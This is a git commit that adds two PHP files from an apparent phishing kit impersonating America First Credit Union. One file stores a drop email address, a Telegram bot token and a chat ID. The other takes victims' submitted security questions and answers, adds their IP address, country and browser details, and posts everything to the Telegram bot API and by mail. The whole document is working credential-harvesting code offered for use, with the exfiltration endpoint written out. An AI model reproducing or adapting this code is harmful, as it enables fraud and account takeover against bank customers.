debcb719f23afa2cb96e4816b5c50963ffe87dcd
ashj0n <151127869+ashj0n@users.noreply.github.com>
2023-12-19 06:42:39 -0600

    Add files via upload

---
+++ 2sec/DOMAIN/dev/audient/icons/libs/grabber.php
@@ -0,0 +1,7 @@
+<?php
+
+$recipient = "azinjames@icloud.com";
+$botToken="5919303424:AAEKUbVdyEBsnt9t2u258g4EUPkpUsopuHE";
+$chatId= '5785273047';
+
+?>
---
+++ 2sec/DOMAIN/dev/audient/icons/libs/process6.php
@@ -0,0 +1,81 @@
+<?php
+
+
+function generateRandomString($length = 10) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+
+//Getting user ip & hostname
+$date =	date("D M d, Y g:i a");
+$user_agent  = $_SERVER['HTTP_USER_AGENT'];
+$user_ip = getenv('REMOTE_ADDR');
+require_once('geoplugin.class.php');
+$geoplugin = new geoPlugin();
+$geoplugin->locate();
+$adddate=date("D M d, Y g:i a");
+$ip = getenv("REMOTE_ADDR");
+
+include("grabber.php");
+
+$message = "-------America First Credit Union Result Q/A--------\n";
+$message .= "Q1: ".$_POST['q1']."\n";
+$message .= "Ans1: ".$_POST['ans1']."\n";
+$message .= "Q2: ".$_POST['q2']."\n";
+$message .= "Ans2: ".$_POST['ans2']."\n";
+$message .= "Q3: ".$_POST['q3']."\n";
+$message .= "Ans3: ".$_POST['ans3']."\n";
+$message .= "============= [ Ip & Hostname Info ] =============\n";
+$message .= "Submitted By : ".$user_ip."\n";
+$message .= "Country Name : {$geoplugin->countryName}"."\n";
+$message .= "Country Code: {$geoplugin->countryCode}\n";
+$message .= "Date And Time : ".$adddate."\n";
+$message .= "Browser Details : ".$user_agent."\n";
+$message .= "--------xXx--------\n";
+$message .= "IP Address: $ip \n";
+
+$website="https://api.telegram.org/bot".$botToken;
+ 
+  $params=[
+      'chat_id'=>$chatId, 
+      'text'=>$message,
+  ];
+  $ch = curl_init($website . '/sendMessage');
+  curl_setopt($ch, CURLOPT_HEADER, false);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_POST, 1);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+  $result = curl_exec($ch);
+  curl_close($ch);
+
+
+
+
+$subject = "America First Credit Union ReZulT | $ip";
+$headers = "From: America First Credit Union <customer@america.com>\n";
+$headers .= "MIME-Version: 1.0\n";
+//$headers .= "Content-Type: text/plain; charset=UTF-8\n";
+//$headers .= "Content-Transfer-Encoding: 8bit\n";
+
+
+if(mail($recipient, $subject, $message)){ 
+   
+//header("Location: identify.php?&".generateRandomString(200));
+}else{
+	
+	echo "error sending email";
+	
+	}
+
+
+//mail($recipient, $subj, $msg,"$headers");
+
+?>
+
+
